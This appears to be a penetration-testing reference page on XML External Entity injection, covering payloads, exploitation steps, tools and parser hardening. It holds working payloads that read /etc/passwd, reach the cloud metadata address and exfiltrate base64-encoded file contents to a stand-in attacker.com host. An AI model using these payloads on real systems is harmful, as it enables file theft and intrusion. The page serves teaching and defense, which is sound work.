# XXE

XML External Entity injection testing.

## How It Works

XML External Entity (XXE) attacks abuse XML parsers that process external entity declarations. When a parser resolves external entities, attacker-defined URIs can read local files, perform SSRF, or cause denial of service.

Classic payload structure:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Blind XXE** uses out-of-band (OOB) callbacks:

```xml
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
```

DTD declares entities that exfiltrate file content via HTTP.

Affected inputs: SOAP APIs, SAML assertions, Office document uploads, SVG, RSS, legacy config import features, and any endpoint accepting XML without hardened parser settings.

Java (`DocumentBuilder`), .NET (`XmlReader` before secure defaults), and PHP (`DOMDocument`) are risky when external entities are enabled.

## Exploitation

**In-band file read**

Post XML with `SYSTEM "file:///etc/passwd"` entity referenced in a response field.

**SSRF via XXE**

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

**Blind exfiltration**

Attacker hosts `evil.dtd`:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

**Attack flow**

```
XML body with malicious DTD → parser resolves external entity → file/SSRF/OOB leak
```

**Tools**

- Burp Collaborator for OOB detection
- `xxeinjector`, custom Python with `lxml` for testing parser configs

**Denial of service**

Billion laughs / quadratic blowup entity expansion can crash parsers lacking limits.

## Defense & Mitigation

**Disable external entities** in every XML parser:

- Java: `factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` and disable DTDs.
- .NET: `XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit }`.
- libxml2: `XML_PARSE_NOENT` must not be combined with network access.

**Prefer JSON** for modern APIs unless XML is required.

**Input validation**

- Reject DOCTYPE declarations at the byte level if feasible.
- Use whitelisted schemas without custom DTD processing.

**Network**

- Block egress from parsers to metadata and internal IPs.

**Library updates**

- Keep parser libraries patched; defaults vary by version.

## Methodology

- [ ] Identify XML input endpoints
- [ ] Test file read via external entities
- [ ] Attempt SSRF through XXE
- [ ] Check blind XXE with out-of-band callbacks

## Tools

| Tool | Usage |
|------|-------|
| `burp` | [Intercept, repeater & scanner](../../TOOLS_GUIDE.md#burp-suite) |
| `xxeinjector` | [XXE payload generator](../../TOOLS_GUIDE.md#xxeinjector) |
| `oxmlxxe` | [Office XML XXE](../../TOOLS_GUIDE.md#oxmlxxe) |

## Resources

- [PortSwigger XXE](https://portswigger.net/web-security/xxe)

## Verification Checklist

- [ ] Review scope and rules of engagement
- [ ] Document baseline behavior
- [ ] Test edge cases and parser differentials
- [ ] Capture proof-of-concept safely
- [ ] Write remediation guidance
